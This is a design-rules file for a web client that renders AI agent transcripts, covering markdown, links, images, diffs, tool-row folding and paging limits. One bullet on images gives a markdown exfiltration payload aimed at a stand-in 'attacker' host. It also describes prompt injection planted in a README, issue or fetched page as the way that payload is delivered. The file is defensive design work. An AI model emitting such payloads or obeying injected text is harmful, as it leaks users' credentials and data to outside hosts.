---
paths:
  - packages/web/src/ui/tail.ts
  - packages/web/src/ui/EventList.tsx
  - packages/web/src/ui/Markdown.tsx
  - packages/web/src/ui/DiffView.tsx
  - packages/web/src/ui/AskCard.tsx
  - packages/web/src/ui/PermissionCard.tsx
  - packages/web/src/ui/ElicitationCard.tsx
  - packages/web/src/ui/Bubble.tsx
  - packages/web/src/ui/ImagePreview.tsx
  - packages/web/src/ui/links.ts
  - packages/web/src/diff.ts
  - packages/web/src/permission.ts
  - packages/web/src/ask.ts
  - packages/web/src/elicitation.ts
  - packages/web/src/preview.ts
  - packages/web/src/store.ts
---

**The transcript.** Agent output is markdown and is rendered as such; raw HTML
stays off, because it is untrusted text quoting an untrusted repository.
`Markdown.tsx` is memoised on the joined text of a coalesced run.

- **Markdown renders what somebody wrote, including the marker they wrote it
  with.** `1)` and `1.` are both CommonMark and **mdast records neither** — a
  `list` node carries `ordered`, `start` and `spread` — so `list-style-type:
  decimal` drew `1.` over a message that said `1)`. `remarkListDelimiter` in
  `ui/mdlist.ts` reads the delimiter back out of `file.value` at the node's own
  `position.start.offset` and marks the list; `index.css` draws the marker with
  `counter(list-item)` on `::marker`. Its own module because `Markdown.tsx` cannot
  be imported offline. **`list-decimal` stays on the element**: a browser that
  will not style `::marker` then draws exactly what it drew before, so there is no
  third state. `start` is passed through as well, which it was not — a message
  beginning `10)` was renumbered as well as re-punctuated.
- **A message you have sent and not had back is a row in the conversation**, from
  `echo.ts` through `SessionView` — never a bubble under the transcript, which is
  where `Composer` used to draw it with a spinner beside it, and from where it
  jumped into the transcript one commit later when the `prompt` event landed. It
  is drawn **above** the working line, because `applySnapshot` can mark a session
  running while its own event is still on the socket. Nothing says "sending": a
  refusal puts the text back in the box with a toast, which is a remedy rather
  than a warning. Keyed by session, so leaving mid-send and coming back still
  shows it. Settled in `store.ts` — `onEvents` compares the seq, and
  `promptLanded` does it again when the POST answers, because that answer
  routinely loses the race to the socket.
- **A message the agent has not been given yet says so, and only where that is
  true.** A `prompt` row whose seq is in the snapshot's `queuedPrompts` draws one
  line under the bubble, `Waiting for the agent to finish`. Nothing is drawn where
  the message was *steered* into the running turn — it is already in front of the
  model, and a status line for something that has already happened is furniture.
  ⚠ **Not the `pending` marker `Bubble.tsx` forbids**: that rule is about a
  message *this tab* has sent and not had answered, a claim about the network
  drawn as doubt over something delivered. This is the daemon reporting a fact
  about the agent, it survives closing the tab, and the bubble is untouched.
  `QueuedContext` carries it for `DecisionsContext`'s reason, and its **identity**
  is part of the contract — `SessionView` memoises the set on the seqs, or every
  bubble re-renders on every token. `mid-turn-messages.md`, Q3.601.
- **A turn that stopped says so in words, and a cancel says it where `working…`
  was.** `stopReasonText` and `resolvedByText` in `tail.ts` replace three places
  that drew a wire identifier with its underscores taken out (`turn cancelled`,
  `pump failed`, `ended: agent_exited`); `bits.tsx`'s `exitText` is the third.
  `cancelled` is the only one somebody *did*, so it takes `WaitingFoot`'s own
  shape — same line, `WorkingMark still`, `text-danger` — and lands in the row the
  working line held an instant earlier, a cancelled turn's `turn_end` being its
  last event. Every other reason stays a centred line. **Every table falls through
  to the identifier for a value it does not know**, which is the rule everywhere
  else on this wire: legible, and never a guess. What is drawn changed and nothing
  else did — `taskFloor` still keys on `stopReason !== "end_turn"` alone, and
  `showsInTranscript` on that plus the `agent_error` exception one bullet down.

- **A link is drawn only where there is somewhere to go.** `openableHref` in
  `ui/links.ts` allows `http`, `https` and `mailto`, answers `null` for everything
  else — a path, a `file://` URI, a fragment — and the text is still drawn without
  an anchor. Widening that set is launching a program named by an agent-chosen
  string, the same judgement as the refusal of `url`-mode elicitation, and a
  workspace file is reachable through `GET /sessions/:id/files` with a header
  rather than an `href` a browser follows. **Not an XSS fix**, said out loud so
  nobody deletes the real guard: `javascript:` never reaches it, react-markdown
  empties that upstream. Q3.300.
- **An image is drawn as text for the same reason, only more so — it needs no
  tap.** `Markdown.tsx` must override `img` and bind **no `src`**. react-markdown's
  default transform allows `https:`, so `![](https://attacker/?d=…)` makes the
  browser fetch a host the *agent* chose, on render, with no interaction, from the
  origin holding `reemoat.credential` — prompt injection planted in a README, an
  issue body or a fetched page is the whole delivery mechanism and the query string
  is the channel. The alt text is kept and nothing regresses, because there is no
  image an agent can name that this origin would serve: a workspace file is fetched
  with a header and rendered by `ImagePreview` from a `Blob`. The document's **CSP**
  is defence in depth rather than the fix — `connect-src` is built from `relayUrl`
  and lists the relay's `wss` origin as well as its `https` one, this page being
  deliberately cross-origin to the fleet. Q7.86.
- **A conversation is read from the top, so it loads from the top.** There is **no
  render window**; `loadAll` pages backwards at `EVENTS_PAGE_LIMIT` a time until it
  reaches the start of the log, the agent's own `/clear`, or the tab's 16 MiB
  ceiling, with no per-run budget and no control offering to fetch more. What pays
  for it is `sameNode`, and `decisions` is a context rather than a prop because a
  fresh `Map` per event defeats that memo on every row at once. Q3.114.
- **A cold load has nothing to draw and must say so.** `reattachSince(null, …)`
  attaches at the tail, so history arrives only over HTTP; `TranscriptSkeleton` is
  keyed on `unfetched > 0` and **not** on `loadingHistory`, so a session that
  really has no events says so with no skeleton first and a failed page does not
  blink the skeleton out and back. `SessionView` draws the same shape before its
  *row* has landed — `missingRowReason` and `AppState.listed` — that session not
  being knowably absent until a list has come back from its machine. Q3.419.
- **The only cut is the agent's, and nothing offers to undo it**: `buildTail`'s
  third argument is `cut`, the newest `context_cleared`. Strictly *below* the
  marker, so the `/clear` prompt goes with the conversation it ended and the marker
  is the top row, drawing **both** facts — the command as a `UserBubble` and a
  hairline rule reading *Context cleared* — since `clearContext` is the only thing
  that emits one and `server.ts` reaches it only on that exact string.
  ⚠ **A reveal control and its `revealedBeforeClear` flag are deleted** (Q3.582):
  `loadStop` stops at `clearedAt` unconditionally, `nextCut` answers one number, and
  `transcriptNotice` stays silent under a cut. The events stay on the daemon and
  nothing here reads them.
- **The daemon's bookkeeping is not part of the conversation.**
  `showsInTranscript` refuses status lines, workspace rows and
  `turn_end: end_turn`. Every *other* stop reason is kept — `max_tokens`,
  `refusal` and `cancelled` are turns that did not finish — with **one exception
  that is silent for the opposite reason**: `agent_error`, the end the daemon
  writes for a turn the agent rejected, is not drawn because the row immediately
  above it is that rejection in the agent's own words. It still raises
  `taskFloor`, which runs before the gate: "nothing is drawn for it" and "nothing
  happened" are different sentences, and `webcheck` pins the pair. Q2.218.
- **A thought is not drawn.** The suppression is in `tail.ts`, not the JSX, so a
  refused node spends no render budget — and a dropped thought still *flushes* the
  run, since parts join with no separator.
- **An event nobody draws does not break the message either.** `buildTail` flushes
  the text run only when the event is *not* in `TRANSCRIPT_SILENT`, whose
  boundaries are invisible; flushing unconditionally splits one streamed message
  into two independently parsed `<Markdown>` blocks. Keyed on the **set** and
  deliberately not on `showsInTranscript`, which also answers false for
  `turn_end: end_turn` — that one *is* a boundary, and `webcheck` fails in both
  directions. Q3.100.
- **A request and its answer collapse to one row**, keyed on *whether an answer
  exists* rather than on the request's `decision` field, which the daemon leaves
  null for the request's whole life. A question is drawn as an exchange (the
  answer entered the model's context); an approval is drawn as one line.
- **A settled question draws what was asked, not just what was picked.**
  `ElicitationResolvedEvent` carries `message` plus `{key, label, value}` per
  answer, and for a multi-question form `message` is the adapter's preamble while
  each real question sits in its field's *description*, which the resolution does
  not carry — so the row read *"Please answer the following questions."* over four
  bare values. `answeredQuestions` recovers the wording from the arguments of the
  tool call `askedThrough` merges away, joining **by identity on the chosen label**
  and never by parsing `question_0` / `<question>__other`, which are two adapters'
  spellings of one idea. A label two questions share matches neither, because
  attributing an answer to the wrong question is worse than attributing it to none.
  The join is in `tail.ts` and arrives as `EventNode.asked`, the same arrangement
  `heading` uses; `null` means *draw what you drew before* and is reached three
  honest ways — the call is outside the window, its `rawInput` is the
  `{truncated, bytes}` stand-in, or the form was never an `AskUserQuestion`.
- **Consecutive plan updates are one card, drawn where the newest one landed.**
  One `TodoWrite` emits a `plan` per streaming refinement — nine events for a
  three-item list, each a full replacement — so the same checklist was drawn nine
  times in a row. `planFloor` in `buildTail` suppresses an older one, and
  **"consecutive" is over *emitted nodes***: over raw events an invisible
  `session_info_update` saves a stale card, and over *drawable* events a
  `permission_request` this walk merges away does. It is one compare, because
  `collected.length` already is that count. **The flush is untouched and that is
  provable rather than a compromise** — `flush()` runs *before* the node decision,
  so an open text run grows `collected` and the older plan is therefore drawn: a
  plan with a message on either side of it is always a real boundary. `plan` stays
  **out** of `TRANSCRIPT_SILENT`, where it would be a lie. Nothing says how many
  were absorbed, and the "a number survives collapse" idiom does not extend: the
  surviving card already contains everything every absorbed update said. ⚠ The row
  is keyed on the newest plan's seq, so an update remounts it — safe only while the
  plan arm holds no component state. Q3.455.
- **A run of consecutive tool rows is one row.** `foldRuns` folds it into a
  `GroupNode` carrying a mechanical sentence — clauses from ACP's `kind`, in the
  order each first appeared, with `+N −M` beside it — that opens to the rows it
  replaced. A run of **one** is never wrapped. Open is three-valued for
  `ultracode`'s reason: `null` follows the run, which decides on **one** thing,
  whether it has finished, and a tap outranks that for good. A failure deliberately
  does **not** open it — `override` is component state while `failed > 0` is
  permanent — so `1 failed` rides the collapsed row instead, a bare `ToolCall`
  opening itself on failure only because it has no badge. The re-measure is an
  effect on `open` and not a call in the tap handler, because tool calls interleave
  and only one of the two triggers is a tap. Q3.105.
  **What a run may never swallow**: a **refusal** or an answer nothing can classify,
  an unanswered request, any question, a subagent (its card is already a summary of N
  steps), an orphaned failed update, and anything that is not a tool call. Each
  **breaks** the run in two.
  An **approval** does fold, in document order, with `N approved` on the collapsed
  row — the same "the number survives collapse" idiom as `1 failed`. The asymmetry
  that remains is the true one: **a refusal cannot be hidden**, because `tail.ts`
  merges the request away and the answer is the only record that somebody said no.
  The verdict is asked of `permissionDecisions` and never of `outcome` —
  `selected` includes every `reject_*` option — and every unknown answer falls
  through to *not foldable*, so a failure to classify shows a row rather than
  hiding a refusal. Q3.106.
- **A file change draws a diff, and the counts are the client's own.** `diffLines`
  in `packages/web/src/diff.ts` is the one line-diff in this package, so the approval card and
  the transcript share `ui/DiffView.tsx` rather than resembling each other: a trim
  plus a **bounded** LCS, because codex sends whole files on both sides where
  claude sends a fragment. The counts come from the event, so they state the
  replacement the agent *stated*; `GET /sessions/:id/changes` has git's own numbers
  and is deliberately not called. Two facts are accepted rather than fixed: a
  claude `Write` reports `oldText: null` even when overwriting, so an overwrite
  reads as a creation; and an event clipped by the 128 KiB cap has both sides cut
  at the same offset, so `unavailable` refuses to draw a diff at all and
  `changeCounts` answers `null` rather than 0 — `?? 0` would report the largest
  edit in the log as an empty one. Q3.104. One edit reported twice (kimi's `diff` +
  `fs_write` pair) is one row: matched on the **path**, one credit per absorbed
  change, spent once and in one direction only — never on content, which is
  Q3.108's own correction.
- **A gap is only ever one the daemon reported**, never one the client invented out
  of its own decision not to fetch. Real retention loss is a line at the top from
  `daemonFirstSeq` and `loadedFrom` rather than a `GapMarker`, the daemon evicting
  a *prefix* that is structurally outside any rendered window, and it is drawn only
  once paging has reached the floor (`unfetched === 0`). Q3.46, Q3.47.
- **A conversation loads whole.** `MAX_TRANSCRIPT_BYTES` (16 MiB) is the only
  ceiling **on one conversation** — no event count beside it, because two bounds on
  one resource means the wrong one decides. It was documented as the *tab's* only
  ceiling and was not one: nothing evicted a transcript, so a tab that visited N
  conversations retained N of them, each entitled to 16 MiB. `MAX_HELD_TRANSCRIPTS`
  (12) is the other half, applied in `trimTranscripts`, and **a session with a live
  stream is never evicted** — so what goes is somewhere you navigated through, at the
  cost of the re-fetch a cold open already pays. `HISTORY_PAGE`/`EVENTS_PAGE_LIMIT` are 5000, a round-trip
  count in disguise since a window spans that many seqs; raising it is free because
  `EVENTS_PAGE_BYTES` (768 KiB) is what actually bounds a page — lowered from 2 MiB
  as the coupled half of `STREAM_WINDOW_BYTES`, so at 5000 seqs the byte cap is what
  governs for anything but a trivial page. Q3.114.
- **Why a conversation does not start at its beginning is *one* answer, and every
  state of it says something.** `transcriptNotice` in `store.ts` is six-valued —
  `skeleton`, `loading`, `stalled`, `ceiling`, `floor`, `empty` — and `EventList`
  draws exactly what it answers, through a single string that also feeds the
  `role="status"` region. It lives beside `loadStop` because the two read the same
  five `Transcript` fields from opposite ends: that one decides whether paging
  carries on, this one says why it is not there yet. `webcheck` asserts the
  **totality** over a 720-state grid — with history outstanding and no cut,
  something is always said. Q3.112.
- **Opening a tool card re-measures whether the reader is still at the bottom.** No
  scroll event fires when content grows *under* you, so `atBottom` stays true and
  the next event scrolls the just-opened card out of view. One `remeasure` on the
  next frame, honest in both directions, rather than a "stop following" flag.

## Layout

| File | Holds |
|---|---|
| `packages/web/src/ui/tail.ts` | The transcript's shape as pure functions: coalescing, the five-events merge, which card a step belongs to, what it refuses to draw, where a `/clear` cuts, what a permission was answered with, `sameNode` — and which rows stand together: `foldRuns`, the clause grammar behind `runSummary`, and the one direction in which a duplicated `file_change` is dropped |
| `packages/web/src/diff.ts` | What a file change was, as lines: the trim, the bounded LCS, hunks with two sets of line numbers, the word-level marks, the `+N −M`, and the refusal to draw a diff over an event the log clipped. The `WeakMap` behind `changeCounts` is why `buildTail` may ask on every token |
| `packages/web/src/ui/DiffView.tsx` | A file change, drawn — for the transcript **and** the approval card. Its body paints `bg-surface` inside a `raised` frame because that is the ground the two tints were measured against; on `raised` they are 1.03:1, i.e. invisible |
| `packages/web/src/ui/links.ts` | `openableHref`: which schemes a tap in agent output may open, and why a relative path is text rather than a link. Named for the case collision with `Markdown.tsx` on a case-insensitive filesystem |
| `packages/web/src/ui/Markdown.tsx` | Agent output as markdown; code blocks with a lazily-loaded highlighter |
| `packages/web/src/ui/mdlist.ts` | Which ordered lists were written with `)`, recovered from the source because mdast throws the character away. Pure, so `webcheck` imports it |
| `packages/web/src/echo.ts` | The message that has been sent and has not come back: a module `Map` with subscribers, keyed by session, the third of `attach.ts`'s shape. At `src/` because `store.ts` settles it |
| `packages/web/src/ui/Bubble.tsx` | The user's own messages, right-aligned. One component, three call sites, and **no `pending`** — a sent message looks sent |

## Bounds

| | |
|---|---|
| Transcript diff | **250 000 LCS cells** (`MAX_LCS_CELLS`) after the prefix/suffix trim, past which it degrades to one replacement block and says `wholeFile` — Q3.104. 60 drawn lines per file (`DIFF_MAX_LINES`), with `omitted` carrying the rest and the counts staying the **true** totals. 2 lines of context (`DIFF_CONTEXT`). A word-level mark is dropped once it would cover more than 60% of its line (`MAX_MARK_SHARE`), past which the two lines are not one line edited and the row tint has already said so — Q3.301. 400 chars (`MAX_MARK_CHARS`) is the longest pair compared character by character. `changeCounts` memoises in a `WeakMap` keyed on the event, so a diff is computed once per event for the life of the tab |

**A download button draws nothing for a location outside the workspace** — not a
disabled button, and not one that toasts when it is pressed. It lived in
`web-composer.md` until the sheet work needed the characters, which is where it
should have been all along: the button is `EventList.tsx`'s, and the composer has
never drawn one.

## Two rules that were filed under the shell

They arrived in `web-shell.md`, where the palette was written down, and are about
**the transcript**. Moved, not copied; this file's globs summon them.

- **Machinery is `text-fg/85`, one value for every machinery row, failures
  included**; the `X` at full `fg` and `N failed` carry a failure instead of
  weight. A permission row reserves the kind-glyph slot **empty**, because it
  folds into a run. Q3.207.
- **A title is clipped in code, and only when the clip pays for a line** —
  `truncate` throws away "was anything cut", which decides whether a card can be
  opened at all. `TITLE_CHARS` 80, `TITLE_OVERFLOW_MIN` 20; the body opens to the
  title in full. `headlineWorthDrawing` is the same judgement one field over: a
  value whose opening 24 characters already appear in the title is an echo.
  Q3.208.
